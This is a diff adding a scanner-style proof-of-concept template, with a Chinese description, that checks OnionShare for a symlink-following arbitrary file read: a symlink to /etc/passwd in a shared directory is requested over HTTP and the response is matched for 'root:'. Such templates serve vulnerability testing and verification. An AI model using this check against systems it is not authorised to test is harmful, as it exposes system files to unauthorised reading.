@@ -1,0 +1,25 @@
+[info]
+author = "ave"
+description = "验证 OnionShare 共享目录中符号链接被跟随导致任意文件读取。在共享目录中创建指向 /etc/passwd 的符号链接，通过 HTTP 访问该文件，若返回内容包含 'root:' 则证明漏洞存在。"
+id = "POC-AVE-2026-0790"
+name = "OnionShare 符号链接跟随任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-0790"]
+vuln_id = [
+    "CVE-2026-54706",
+    "AVE-2026-0790",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/symlink_to_passwd"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
